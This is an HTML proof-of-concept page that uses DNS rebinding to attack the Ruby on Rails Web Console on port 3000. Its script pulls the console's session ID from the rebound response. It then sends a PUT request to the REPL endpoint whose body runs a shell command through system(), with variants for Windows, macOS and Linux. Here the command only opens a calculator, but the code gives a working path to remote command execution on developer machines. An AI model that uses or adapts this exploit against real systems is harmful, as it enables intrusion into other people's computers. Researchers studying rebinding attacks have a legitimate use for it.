<!--
This payload is exploiting the Ruby on Rails Web Console (https://github.com/rails/web-console), 
debugging tool for your Ruby on Rails applications.
The exploit performs two RPC requests:
- / : Get request to / to get the web console session ID
- /__web_console/repl_sessions/{SESSION-ID} : PUT request to run the calculator app for a proof of concept
The default RPC port for the rails web console is TCP 3000 (127.0.0.1:3000)
-->
<!doctype html>
<html>

<head>
	<title>Ruby on Rails Web Console DNS Rebinding Attack</title>
	<script src="payload.js"></script>
	<script>
		// attack() is called once DNS rebinding is successful
		// headers and body contains server data obtained 
		// from the victim service during rebinding, if any.
		function attack(headers, cookie, body) {

			let myHeaders = new Headers();

			match = body.match(/data-session-id='([^']+)'/);

			if (match === null) {
				throw new Error('Could not find data-session-id!');
			}

			console.log("data-session-id is " + match[1]);
			let path = "/__web_console/repl_sessions/" + match[1];

			myHeaders.append("Accept", "application/vnd.web-console.v2");
			myHeaders.append("X-Requested-With", "XMLHttpRequest");
			myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

			fetch(path, {
				method: 'PUT',
				headers: myHeaders,
				//body: "input=system(%22calc%22)" // Windows
				//body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%22)" // OSX
				//body: "input=system(%22xcalc%26%22)" // Linux (the & (%26) is to execute the command in the background)
				body: "input=system(%22open%20%2fApplications%2fCalculator.app%26xcalc%26%22)" // OSX & Linux combined ("open /Applications/Calculator.app&xcalc&")
			})
		}
	</script>
</head>

<body onload="begin('/')" )>
	<h3>Ruby on Rails Web Console Payload</h3>
	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body>
</html>